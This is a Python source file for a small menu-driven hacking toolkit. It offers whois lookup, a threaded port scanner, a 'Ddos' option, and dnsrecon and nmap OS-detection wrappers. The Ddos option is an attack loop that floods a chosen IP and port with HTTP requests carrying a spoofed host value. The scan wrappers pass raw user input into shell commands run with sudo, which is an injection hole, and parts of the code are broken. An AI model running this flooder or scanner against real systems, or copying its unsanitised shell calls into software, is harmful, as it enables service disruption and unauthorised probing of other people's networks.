import better_pywhois
import time
from queue import Queue
import socket
import threading
import enquiries
import nmap
from scapy.all import *
import os


######################################

def afi():
      y = input("enter a domain : ")
      w = better_pywhois.recursive_query(y)
      print(w)
      menu()

def menu():
      options = ['Whois', 'Port Scanner','Ddos', 'DNS scan' , 'OS scan' , 'Exit' ]
      choice = enquiries.choose('Choose one of these options: ', options)
      print(choice)





      if choice=="Whois":
         afi()


      if choice=="Port Scanner":
         socket.setdefaulttimeout(0.55)
         print_lock = threading.Lock()
         target = input('Host to Scan: ')
         t_IP = socket.gethostbyname(target)
         print ('Scanning Host for Open Ports: ', t_IP)
         def portscan(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
               conx = s.connect((t_IP, port))
               with print_lock:
                  print(port, 'is open')
               conx.close()
               
            except:
               pass
               
         def threader():
            while True:
               worker = q.get()
               portscan(worker)
               q.task_done() 
         q = Queue()
         
         startTime = time.time()
         
         for x in range(300):
            t = threading.Thread(target = threader)
            t.daemon = True
            t.start()
            
         for worker in range(1, 5000):
            q.put(worker)
         q.join()
         menu()

              



      if choice=="Ddos":
            target =input("IP : ")
            fake_ip = input("FAKE IP : ")
            port = int(input("PORT : "))
            tedadhamleersali= int(input("NUMBER OF PACKETS : "))
            print("Attack is RUnning:")
            while True:
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               s.connect((target, port))
               s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
               s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

               s.close()

               menu() 

         






      if choice=='DNS scan':
         dnsdomain=input("enter domain: ")
         os.system('sudo apt install dnsrecon')
         os.system('dnsrecon -d '+dnsdomain)
         menu()


      if choice=='OS scan':
         
         sc=input("ENTER IP : ")
         print('----------------------------------------------------')
         # Os detection (need root privileges)
         os.system('sudo apt install nmap')
         os.system('sudo nmap -O '+sc)
         menu()


      if choice=="Exit":
            exit()


print("""
 _                                                                     _     _ 
(_)                                                                   | |   | |
 _ _ __ __ _ _ __    ___  ___  ___ _   _ _ __ ___  __      _____  _ __| | __| |
| | '__/ _` | '_ \  / __|/ _ \/ __| | | | '__/ _ \ \ \ /\ / / _ \| '__| |/ _` |
| | | | (_| | | | | \__ \  __/ (__| |_| | | |  __/  \ V  V / (_) | |  | | (_| |
|_|_|  \__,_|_| |_| |___/\___|\___|\__,_|_|  \___|   \_/\_/ \___/|_|  |_|\__,_|
                                                                               
                                                                               """)

menu()